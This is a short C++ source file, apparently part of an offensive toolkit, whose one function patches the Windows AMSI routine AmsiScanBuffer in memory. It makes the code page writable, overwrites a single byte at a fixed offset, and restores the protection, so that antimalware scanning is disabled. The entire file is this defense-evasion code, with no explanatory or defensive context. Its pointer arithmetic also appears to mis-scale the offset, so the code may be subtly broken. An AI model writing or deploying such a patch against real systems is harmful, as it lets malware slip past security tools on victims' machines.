#include "core/technique.hpp"

namespace Technique::AmsiBypass
{
    BOOL PatchAmsi(Procs::PPROCS pProcs)
    {
        DWORD dwOldProtect = 0;
        DWORD dwOffset = 0x83;

        if (!pProcs->lpVirtualProtect(
            (PVOID*)pProcs->lpAmsiScanBuffer + dwOffset,
            1,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
        )) {
            return FALSE;
        }
        memcpy((PVOID*)pProcs->lpAmsiScanBuffer + dwOffset, "\x72", 1);
        if (!pProcs->lpVirtualProtect(
            (PVOID*)pProcs->lpAmsiScanBuffer + dwOffset,
            1,
            dwOldProtect,
            &dwOldProtect
        )) {
            return FALSE;
        }

        return TRUE;
    }
}
